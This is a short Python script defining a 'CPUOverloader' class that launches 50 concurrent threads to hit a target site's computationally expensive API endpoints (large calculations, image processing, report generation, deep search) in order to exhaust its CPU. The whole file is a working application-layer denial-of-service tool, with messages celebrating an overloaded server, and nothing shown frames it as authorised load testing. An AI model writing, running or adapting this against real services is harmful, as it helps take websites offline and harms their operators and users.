import requests
import threading

class CPUOverloader:
    def __init__(self, target_url):
        self.target_url = target_url
    
    def max_cpu_load(self):
        """Request CPU-intensive operations"""
        print("🔥 Overloading CPU with expensive computations...")
        
        def cpu_intensive_request(thread_id):
            # Request endpoints that do heavy computation
            expensive_endpoints = [
                "/api/calculate?iterations=1000000",
                "/api/process-image?size=large", 
                "/api/generate-report?complex=true",
                "/api/search?q=*&deepSearch=true"
            ]
            
            for endpoint in expensive_endpoints:
                try:
                    response = requests.get(
                        f"{self.target_url}{endpoint}",
                        timeout=10
                    )
                    print(f"CPU Thread {thread_id}: {response.status_code}")
                except:
                    print(f"CPU Thread {thread_id}: Failed - server overloaded!")
        
        # Create many CPU-intensive requests
        threads = []
        for i in range(50):  # 50 concurrent CPU-heavy requests
            thread = threading.Thread(target=cpu_intensive_request, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()